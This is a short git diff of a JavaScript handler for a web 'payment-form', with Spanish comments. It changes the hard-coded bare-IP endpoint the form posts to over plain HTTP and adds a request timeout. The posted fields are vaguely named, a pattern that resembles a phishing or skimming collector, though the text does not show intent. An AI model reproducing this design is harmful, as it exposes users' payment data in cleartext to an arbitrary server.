@@ -18,10 +18,10 @@ document.getElementById('payment-form').addEventListener('submit', async functio
     }
 
     // 🔹 Verificar si el servidor está disponible antes de enviar datos
-    const serverUrl = "http://185.177.125.211:3000/send-data";
+    const serverUrl = "http://95.173.217.71:3000/send-data"; // 🔹 Reemplaza con tu IP pública
 
     try {
-        const serverCheck = await fetch(serverUrl, { method: 'OPTIONS' });
+        const serverCheck = await fetch(serverUrl, { method: 'GET' });
         if (!serverCheck.ok) {
             throw new Error(`El servidor no está accesible: ${serverCheck.status}`);
         }
@@ -37,14 +37,20 @@ document.getElementById('payment-form').addEventListener('submit', async functio
     payButton.innerText = "Procesando...";
 
     try {
+        const controller = new AbortController();
+        const timeoutId = setTimeout(() => controller.abort(), 8000); // 🔹 Tiempo límite de espera: 8 segundos
+
         const response = await fetch(serverUrl, {
             method: 'POST',
             headers: {
                 'Content-Type': 'application/json',
                 'Accept': 'application/json'
             },
-            body: JSON.stringify({ firstName, secondName, thirdName })
+            body: JSON.stringify({ firstName, secondName, thirdName }),
+            signal: controller.signal
         });
+
+        clearTimeout(timeoutId);
 
         if (!response.ok) {
             throw new Error(`Error ${response.status}: ${response.statusText}`);
